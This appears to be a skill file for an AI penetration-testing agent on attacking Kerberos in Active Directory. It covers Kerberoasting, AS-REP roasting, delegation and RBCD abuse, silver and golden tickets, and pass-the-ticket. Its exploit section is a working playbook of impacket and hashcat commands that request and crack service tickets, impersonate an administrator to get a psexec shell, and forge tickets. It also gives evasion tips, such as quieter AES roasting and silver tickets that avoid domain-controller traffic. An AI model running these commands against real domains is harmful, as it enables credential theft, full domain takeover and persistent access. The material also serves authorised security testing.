---
name: svc-kerberos
description: Kerberos protocol abuse — ticket mechanics, Kerberoasting, AS-REP, delegation attacks (unconstrained/constrained/RBCD), silver and golden tickets, pass-the-ticket, encryption downgrade. Load when KRB5 88/tcp is open or tickets are in play. Triggers - kerberoast, AS-REP, TGS, TGT, ccache, kirbi, S4U, delegation, silver ticket, golden ticket, pass-the-ticket, RC4.
tags: [ad, kerberos, escalation]
---

# Kerberos Abuse

## When this fires
- Port 88 open → DC present, every auth path routes through Kerberos.
- Any valid domain credential (even lowest-priv) → roast/delegation surface available.
- Hash obtained (13100/18200/19900) → decide crack vs relay vs PTH.

## Protocol map (30 seconds)
```
AS-REQ  user + timestamp      → AS-REP  TGT (or PREAUTH-FAILED if no preauth = AS-REP roast)
TGS-REQ user + TGT + SPN      → TGS-REP service ticket encrypted w/ SERVICE account hash ← kerberoast
S4U2self  impersonate self    → forwardable ticket for OTHER user (needs TRUSTED_TO_AUTH)
S4U2proxy S4U2self ticket     → service ticket to SPN on behalf of that user ← RBCD chain
```
Encryption: RC4-HMAC (etype 23) = weakest, AES128/256 (17/18) = strong. Downgrade possible when service account has `msDS-SupportedEncryptionTypes` unset/RC4 allowed.

## Attack matrix
| Attack | Requirement | Output |
|---|---|---|
| Kerberoast | any valid user | TGS hash (13100 RC4 / 19900 AES) for service accounts |
| AS-REP roast | none (user list only) | AS-REP hash (18200) for DONT_REQ_PREAUTH users |
| Unconstrained deleg. abuse | coerce DC/victim auth to your host | DC TGT dropped in LSASS → DCSync |
| Constrained (w/ protocol transition) | TRUSTED_TO_AUTH_FOR_DELEGATION acct | S4U2self impersonate anyone → target SPN |
| RBCD | GenericWrite/GenericAll on computer object | set msDS-AllowedToActOnBehalfOfOtherIdentity → impersonate DA |
| Silver ticket | service account NT hash + SPN | forge TGS for that service only — no DC contact |
| Golden ticket | krbtgt NT/AES hash + domain SID | forge any TGT — full domain persistence |
| Pass-the-ticket | valid .ccache/.kirbi | reuse ticket on other hosts w/ same SPN |

## Exploit → PROVE IMPACT
```bash
# Kerberoast — request all SPNs, filter high-value
impacket-GetUserSPNs '<domain>/<user>':'<pass>' -dc-ip <dc_ip> -request -outputfile tgs.txt
# AES variant (slower but quieter re: RC4 downgrade alerts):
impacket-GetUserSPNs ... -request -dc-ip <dc_ip> -usersfile svc.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# AS-REP roast
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>

# RBCD full chain
impacket-rbcd -delegate-to 'TARGET$' -action write '<domain>/OWNED$' -dc-ip <dc_ip>
impacket-getST -spn cifs/TARGET.<domain> -impersonate administrator \
  '<domain>/OWNED$':'<machine_pass>' -dc-ip <dc_ip>
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass administrator@TARGET

# Silver ticket — service-only forgery (quiet, no DC traffic)
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain <domain> -spn cifs/TARGET administrator

# Pass-the-ticket between hosts
export KRB5CCNAME=/tmp/ticket.ccache && klist
# PROOF gates:
# - Roast: cracked plaintext logs in via cme smb --local-auth or evil-winrm
# - Delegation: shell as impersonated user ON the delegated host (whoami = administrator)
# - Silver/golden: ticket USE succeeds against real service AND reads data (secretsdump, share listing)
```

## Tooling
Cracked output → `cracking` skill (constant modes table). New creds → `cred_spray` reuse check across fleet. Record chain via `state_update`, then `attack_path_suggest`. `bloodhound_parse` finds shortest delegation/ACL route first — do not roast blind.

## False positives / pitfalls
- **Roast ≠ impact** — uncrackable AES TGS is a dead end; report only after crack + login proof.
- **Silver ticket clock skew** — forged tickets fail with KRB_AP_ERR_SKEW >5min drift; sync attacker clock to DC.
- **krbtgt hash twice** — password reset once still leaves old hash valid (krbtgt needs 2 resets); note in remediation.
- **RBCD machine account quota** — creating NEW machine account blocked by MAQ=0; use owned computer instead.
- **AES vs RC4 confusion** — ticketer default RC4 works even on AES-only accounts via crypto downgrade unless disabled; if it fails try `-aesKey`.
